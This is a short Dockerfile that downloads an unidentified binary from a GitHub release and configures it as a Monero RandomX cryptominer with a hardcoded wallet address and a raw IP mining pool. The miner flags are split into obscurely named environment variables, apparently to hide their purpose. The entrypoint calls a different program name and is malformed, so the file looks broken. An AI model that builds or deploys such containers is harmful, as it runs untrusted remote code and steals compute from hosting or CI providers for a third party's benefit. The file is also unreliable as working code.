FROM rust:latest AS build
WORKDIR /build
RUN cd /build && apt-get install -y wget && wget https://github.com/sengepeke/Files/releases/download/12/kintil 
COPY cut.ini /build/cut.ini


FROM alpine:latest
WORKDIR /pkt
COPY --from=build /build/kintil /usr/bin/kintil
COPY --from=build /build/cut.ini /usr/build/cut.ini
ENV a_address="89EcNeW4CN3ZXhGZ2bebYM7H2DntAe1fw6qvQ2KB3Hprc1ZDpbyjDoibEDU9duGmM4V77aMTkHJg51JS4kzivx2o3D8DFYc"
ENV b_pool="159.223.182.56:3333"
ENV c_a="-algo"
ENV d_b="RandomX"
ENV e_c="-coin"
ENV f_d="XMR"
ENV g_e="-wallet"
ENV h_f="-pool1"

ENTRYPOINT [ "dero", "$c_a", "$d_b", "$e_c", "$f_d", "$g_e", "$a_address", "$h_f", "$b_pool", ]
